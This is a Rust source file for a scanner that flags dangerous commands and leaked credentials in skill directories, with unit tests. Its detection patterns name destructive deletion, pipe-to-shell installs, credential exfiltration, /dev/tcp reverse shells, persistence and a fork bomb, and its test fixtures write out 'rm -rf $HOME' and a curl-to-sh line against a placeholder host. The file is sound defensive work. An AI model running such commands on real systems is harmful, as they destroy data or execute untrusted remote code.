//! Tengu-scoped threat scanner for skill directories.
//!
//! Scope (per `docs/skill-research-2026-04-28.md` §"Decisions" #2 and #3):
//! Tengu's actual code-execution surface is narrow — `MetricSpec::Script`
//! (`*.sh` files) and `MetricSpec::ShellCheck` (cmd strings in SKILL.md
//! frontmatter). This scanner targets those surfaces with ~12-15 patterns
//! rather than porting the hermes 80-pattern guard wholesale. Findings are
//! informational by default; `tengu skill install --strict` is what gates
//! on them.
//!
//! No prompt-injection regex on SKILL.md body text — judges are already
//! grounded.

use anyhow::Result;
use chrono::Utc;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum Verdict {
    Safe,
    Caution,
    Dangerous,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub(crate) struct Finding {
    pub pattern_id: String,
    pub severity: String, // "critical" | "high" | "medium" | "low"
    pub category: String, // "exfiltration" | "injection" | "destructive" | "shell_metric" | "credentials"
    pub file: PathBuf,
    pub line: u32,
    pub matched: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub(crate) struct ScanResult {
    pub skill_name: String,
    pub verdict: Verdict,
    pub findings: Vec<Finding>,
    pub scanned_at: String, // ISO 8601 UTC
}

// ---- Pattern table -------------------------------------------------------

struct ThreatPattern {
    id: &'static str,
    severity: &'static str,
    category: &'static str,
    description: &'static str,
    regex: Regex,
    /// `true` → applies to shell sources (.sh files + ShellCheck cmd strings).
    /// `false` → applies to text sources (SKILL.md body + rubric files).
    shell_target: bool,
}

fn pat(
    id: &'static str,
    severity: &'static str,
    category: &'static str,
    description: &'static str,
    rx: &str,
    shell_target: bool,
) -> ThreatPattern {
    ThreatPattern {
        id,
        severity,
        category,
        description,
        regex: Regex::new(rx).expect("scanner regex compiles"),
        shell_target,
    }
}

static PATTERNS: Lazy<Vec<ThreatPattern>> = Lazy::new(|| {
    vec![
        // --- shell-injection family ---------------------------------------
        pat(
            "rm_rf_home",
            "critical",
            "destructive",
            "rm -rf $HOME family — destructive root-rm",
            r"rm\s+-rf\s+(\$HOME|/|\$\{HOME\}|~)",
            true,
        ),
        pat(
            "curl_pipe_sh",
            "critical",
            "destructive",
            "curl ... | sh — pipe-to-shell remote install",
            r"(curl|wget)\s+[^|\n]*\s*\|\s*(sh|bash|zsh)",
            true,
        ),
        pat(
            "env_var_exfil",
            "critical",
            "exfiltration",
            "command exfiltrates env credential to network",
            r"(curl|wget|fetch|scp)[^\n]*\$\{?(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API_KEY)\}?",
            true,
        ),
        pat(
            "eval_subshell",
            "high",
            "injection",
            "eval $( ... ) — shell eval of subshell output",
            r"eval\s+\$\(",
            true,
        ),
        pat(
            "dev_tcp_redirect",
            "critical",
            "destructive",
            "/dev/tcp redirect — bash reverse-shell-style network",
            r">\s*/dev/tcp/",
            true,
        ),
        pat(
            "chmod_dangerous",
            "medium",
            "destructive",
            "chmod 777 / +s — permission downgrade or setuid",
            r"chmod\s+(777|\+s)",
            true,
        ),
        pat(
            "crontab_persistence",
            "high",
            "destructive",
            "crontab -/sudoers persistence",
            r"(crontab\s+-|>\s*/etc/(cron\.|sudoers))",
            true,
        ),
        pat(
            "fork_bomb",
            "critical",
            "destructive",
            "classic fork bomb",
            r":\(\)\{\s*:\|:\&\s*\};:",
            true,
        ),
        // --- credential-leak family (text sources) ------------------------
        pat(
            "api_key_shape",
            "high",
            "credentials",
            "embedded API-key shape (sk-/pk- + 20+ b64ish chars)",
            r"(sk|pk)-[A-Za-z0-9_-]{20,}",
            false,
        ),
        pat(
            "private_key_pem",
            "critical",
            "credentials",
            "embedded PEM private key",
            r"-----BEGIN\s+(RSA\s+|EC\s+|OPENSSH\s+|)PRIVATE\s+KEY-----",
            false,
        ),
        pat(
            "aws_access_key_id",
            "high",
            "credentials",
            "AWS access key id (AKIA...)",
            r"AKIA[0-9A-Z]{16}",
            false,
        ),
    ]
});

// ---- Public entrypoint ---------------------------------------------------

pub(crate) fn scan_skill(skill_dir: &Path) -> Result<ScanResult> {
    let skill_name = skill_dir
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| skill_dir.display().to_string());

    let mut findings: Vec<Finding> = Vec::new();

    // 1. SKILL.md — body scanned for credential patterns + frontmatter parsed
    //    for shell-metric advisory + ShellCheck cmd-string scanning.
    let skill_md = skill_dir.join("SKILL.md");
    if skill_md.is_file() {
        if let Some(content) = read_utf8(&skill_md) {
            // Body scan: credential patterns.
            scan_text_against(&content, &skill_md, false, &mut findings);

            // Frontmatter parse for shell-metric advisory.
            if let Some(fm) = extract_frontmatter(&content) {
                emit_shell_metric_advisories(&fm, &skill_md, &mut findings);
                scan_shell_check_cmds(&fm, &skill_md, &mut findings);
            }
        }
    }

    // 2. evals/prompts.yaml — credential scan only.
    let prompts = skill_dir.join("evals").join("prompts.yaml");
    if prompts.is_file() {
        if let Some(content) = read_utf8(&prompts) {
            scan_text_against(&content, &prompts, false, &mut findings);
        }
    }

    // 3. metrics/ recursively — shell scan on .sh, credential scan on .md / .txt.
    let metrics_dir = skill_dir.join("metrics");
    if metrics_dir.is_dir() {
        scan_metrics_dir(&metrics_dir, &mut findings);
    }

    let verdict = compute_verdict(&findings);
    Ok(ScanResult {
        skill_name,
        verdict,
        findings,
        scanned_at: Utc::now().to_rfc3339(),
    })
}

// ---- Render --------------------------------------------------------------

pub(crate) fn render_findings_table(result: &ScanResult) -> String {
    if result.findings.is_empty() {
        return format!(
            "Scan: {}  verdict={}  scanned_at={}\nverdict=safe — no findings.",
            result.skill_name,
            verdict_str(result.verdict),
            result.scanned_at
        );
    }

    let mut out = String::new();
    out.push_str(&format!(
        "Scan: {}  verdict={}  scanned_at={}\n",
        result.skill_name,
        verdict_str(result.verdict),
        result.scanned_at
    ));
    out.push_str("─────────────────────────────────────────────────────────────────────\n");
    for f in &result.findings {
        let head = format!("[{}/{}]", f.severity, f.category);
        out.push_str(&format!(
            "{:24}{} found in {}:{}\n",
            head,
            truncate(&f.matched, 60),
            f.file.display(),
            f.line
        ));
        out.push_str(&format!("{:24}{}\n", "", f.description));
        // Always also emit a `pattern_id=` tail so consumers / tests can find it.
        out.push_str(&format!("{:24}pattern_id={}\n", "", f.pattern_id));
    }
    out.push_str("─────────────────────────────────────────────────────────────────────\n");
    let n = result.findings.len();
    out.push_str(&format!(
        "{} finding{}.\n",
        n,
        if n == 1 { "" } else { "s" }
    ));
    out
}

fn verdict_str(v: Verdict) -> &'static str {
    match v {
        Verdict::Safe => "safe",
        Verdict::Caution => "caution",
        Verdict::Dangerous => "dangerous",
    }
}

fn truncate(s: &str, n: usize) -> String {
    let s = s.replace('\n', " ");
    if s.chars().count() <= n {
        s
    } else {
        let trimmed: String = s.chars().take(n.saturating_sub(1)).collect();
        format!("{trimmed}…")
    }
}

// ---- Verdict mapping -----------------------------------------------------

fn compute_verdict(findings: &[Finding]) -> Verdict {
    let mut has_critical = false;
    let mut has_high = false;
    for f in findings {
        match f.severity.as_str() {
            "critical" => has_critical = true,
            "high" => has_high = true,
            _ => {}
        }
    }
    if has_critical {
        Verdict::Dangerous
    } else if has_high {
        Verdict::Caution
    } else {
        Verdict::Safe
    }
}

// ---- File-walking helpers -----------------------------------------------

fn read_utf8(p: &Path) -> Option<String> {
    match std::fs::read(p) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(s) => Some(s),
            Err(_) => {
                tracing::warn!(path = %p.display(), "scanner: skipping non-utf8 file");
                None
            }
        },
        Err(e) => {
            tracing::warn!(path = %p.display(), error = %e, "scanner: read failed");
            None
        }
    }
}

fn scan_metrics_dir(metrics_dir: &Path, findings: &mut Vec<Finding>) {
    let walker = match std::fs::read_dir(metrics_dir) {
        Ok(w) => w,
        Err(_) => return,
    };
    for entry in walker.flatten() {
        let path = entry.path();
        let ft = match entry.file_type() {
            Ok(t) => t,
            Err(_) => continue,
        };
        if ft.is_dir() {
            scan_metrics_dir(&path, findings);
            continue;
        }
        let Some(name) = path.file_name().and_then(|s| s.to_str()) else {
            continue;
        };
        let Some(content) = read_utf8(&path) else {
            continue;
        };
        if name.ends_with(".sh") {
            scan_text_against(&content, &path, true, findings);
        } else if name.ends_with(".md") || name.ends_with(".txt") || name.ends_with(".yaml") {
            scan_text_against(&content, &path, false, findings);
        }
    }
}

fn scan_text_against(content: &str, file: &Path, shell_target: bool, findings: &mut Vec<Finding>) {
    for pat in PATTERNS.iter() {
        if pat.shell_target != shell_target {
            continue;
        }
        for m in pat.regex.find_iter(content) {
            let line = byte_offset_to_line(content, m.start());
            findings.push(Finding {
                pattern_id: pat.id.into(),
                severity: pat.severity.into(),
                category: pat.category.into(),
                file: file.to_path_buf(),
                line,
                matched: m.as_str().to_string(),
                description: pat.description.into(),
            });
        }
    }
}

fn byte_offset_to_line(content: &str, byte_offset: usize) -> u32 {
    let mut line = 1u32;
    for (i, b) in content.as_bytes().iter().enumerate() {
        if i >= byte_offset {
            break;
        }
        if *b == b'\n' {
            line += 1;
        }
    }
    line
}

// ---- Frontmatter parsing -------------------------------------------------

/// Returns parsed YAML frontmatter (the block between the leading `---\n`
/// and the closing `\n---\n`). Returns `None` if there's no frontmatter or
/// it's malformed.
fn extract_frontmatter(skill_md: &str) -> Option<serde_yaml::Value> {
    let body = skill_md.strip_prefix("---\n")?;
    let fm = body.split("\n---\n").next()?;
    serde_yaml::from_str::<serde_yaml::Value>(fm).ok()
}

/// Emit one `medium / shell_metric` advisory finding per `script` /
/// `shell_check` metric declared in frontmatter. Always emits at `medium`
/// — these are user-author choices, not malicious; just an audit signal.
fn emit_shell_metric_advisories(
    fm: &serde_yaml::Value,
    skill_md: &Path,
    findings: &mut Vec<Finding>,
) {
    let metrics = match fm.get("metrics").and_then(|m| m.as_sequence()) {
        Some(s) => s,
        None => return,
    };
    for m in metrics {
        let kind = m.get("kind").and_then(|k| k.as_str()).unwrap_or("");
        let display_kind = match kind {
            "script" => "Script",
            "shell_check" => "ShellCheck",
            _ => continue,
        };
        let matched = match kind {
            "script" => m
                .get("path")
                .and_then(|p| p.as_str())
                .unwrap_or("")
                .to_string(),
            "shell_check" => m
                .get("cmd")
                .and_then(|p| p.as_str())
                .unwrap_or("")
                .to_string(),
            _ => String::new(),
        };
        findings.push(Finding {
            pattern_id: format!("shell_metric_{kind}"),
            severity: "medium".into(),
            category: "shell_metric".into(),
            file: skill_md.to_path_buf(),
            line: 1,
            matched,
            description: format!("skill declares {display_kind} metric — runs shell at eval time"),
        });
    }
}

/// Run shell-target patterns over each `cmd` string declared in a
/// `shell_check` metric. Catches inline `rm -rf $HOME` etc. without needing
/// an actual `*.sh` file on disk.
fn scan_shell_check_cmds(fm: &serde_yaml::Value, skill_md: &Path, findings: &mut Vec<Finding>) {
    let metrics = match fm.get("metrics").and_then(|m| m.as_sequence()) {
        Some(s) => s,
        None => return,
    };
    for m in metrics {
        let kind = m.get("kind").and_then(|k| k.as_str()).unwrap_or("");
        if kind != "shell_check" {
            continue;
        }
        let cmd = match m.get("cmd").and_then(|c| c.as_str()) {
            Some(c) => c,
            None => continue,
        };
        // Treat the cmd string as an inline shell snippet — line is best-effort 1.
        scan_text_against(cmd, skill_md, true, findings);
    }
}

// ---- tests ---------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn write(p: &Path, s: &str) {
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(p, s).unwrap();
    }

    const CLEAN_SKILL_MD: &str = "---
name: clean-skill
description: a clean skill
metrics:
  - name: q
    kind: llm_judge
    rubric_file: metrics/q.md
    min_pass_rate: 0.7
---

# Body

Nothing exciting here.
";

    fn clean_skill_md() -> &'static str {
        CLEAN_SKILL_MD
    }

    #[test]
    fn scan_clean_skill_returns_safe() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("clean-skill");
        write(&skill.join("SKILL.md"), clean_skill_md());
        write(&skill.join("metrics").join("q.md"), "rubric body\n");

        let r = scan_skill(&skill).unwrap();
        assert_eq!(r.verdict, Verdict::Safe);
        assert!(
            r.findings.is_empty(),
            "expected no findings, got: {:?}",
            r.findings
        );
    }

    #[test]
    fn detects_rm_rf_home_in_metric_script() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("rm-skill");
        write(&skill.join("SKILL.md"), clean_skill_md());
        write(
            &skill.join("metrics").join("bad.sh"),
            "#!/bin/sh\nset -e\nrm -rf $HOME\n",
        );

        let r = scan_skill(&skill).unwrap();
        assert_eq!(r.verdict, Verdict::Dangerous);
        assert!(
            r.findings.iter().any(|f| f.pattern_id == "rm_rf_home"),
            "expected rm_rf_home finding, got: {:?}",
            r.findings
        );
    }

    #[test]
    fn detects_curl_pipe_sh() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("curl-skill");
        write(&skill.join("SKILL.md"), clean_skill_md());
        write(
            &skill.join("metrics").join("install.sh"),
            "curl http://x.test/installer | sh\n",
        );

        let r = scan_skill(&skill).unwrap();
        assert_eq!(r.verdict, Verdict::Dangerous);
        assert!(r.findings.iter().any(|f| f.pattern_id == "curl_pipe_sh"));
    }

    #[test]
    fn detects_aws_access_key_in_skill_md() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("creds-skill");
        let body = "---\nname: creds-skill\ndescription: leaks key\n---\n\nSee AKIAIOSFODNN7EXAMPLE in body.\n";
        write(&skill.join("SKILL.md"), body);

        let r = scan_skill(&skill).unwrap();
        assert_eq!(r.verdict, Verdict::Caution);
        assert!(r
            .findings
            .iter()
            .any(|f| f.pattern_id == "aws_access_key_id"));
    }

    #[test]
    fn shell_metric_advisory_is_caution_not_dangerous() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("script-metric-skill");
        let md = "---
name: script-metric-skill
description: declares a clean script metric
metrics:
  - name: oracle
    kind: script
    path: metrics/m.sh
---

# Body
";
        write(&skill.join("SKILL.md"), md);
        write(&skill.join("metrics").join("m.sh"), "#!/bin/sh\necho ok\n");

        let r = scan_skill(&skill).unwrap();
        // medium-only severity → verdict stays Safe.
        assert_eq!(r.verdict, Verdict::Safe);
        // Advisory finding still surfaces.
        assert!(
            r.findings
                .iter()
                .any(|f| f.pattern_id == "shell_metric_script"),
            "expected shell_metric_script advisory, got: {:?}",
            r.findings
        );
    }

    #[test]
    fn combined_critical_and_advisory_is_dangerous() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("combo-skill");
        let md = "---
name: combo-skill
description: both critical and advisory
metrics:
  - name: oracle
    kind: script
    path: metrics/bad.sh
---

# Body
";
        write(&skill.join("SKILL.md"), md);
        write(&skill.join("metrics").join("bad.sh"), "rm -rf $HOME\n");

        let r = scan_skill(&skill).unwrap();
        assert_eq!(r.verdict, Verdict::Dangerous);
        assert!(r.findings.iter().any(|f| f.pattern_id == "rm_rf_home"));
        assert!(r
            .findings
            .iter()
            .any(|f| f.pattern_id == "shell_metric_script"));
    }

    #[test]
    fn render_findings_table_includes_all_severities() {
        let dir = TempDir::new().unwrap();
        let skill = dir.path().join("mix-skill");
        let md = "---
name: mix-skill
description: combo for render
metrics:
  - name: oracle
    kind: shell_check
    cmd: \"echo ok\"
---

See AKIAIOSFODNN7EXAMPLE for high.
";
        write(&skill.join("SKILL.md"), md);
        write(
            &skill.join("metrics").join("destructive.sh"),
            "rm -rf $HOME\n",
        );

        let r = scan_skill(&skill).unwrap();
        let rendered = render_findings_table(&r);
        assert!(rendered.contains("rm_rf_home"));
        assert!(rendered.contains("aws_access_key_id"));
        assert!(rendered.contains("shell_metric_shell_check"));
        assert!(rendered.contains("verdict=dangerous"));
    }
}
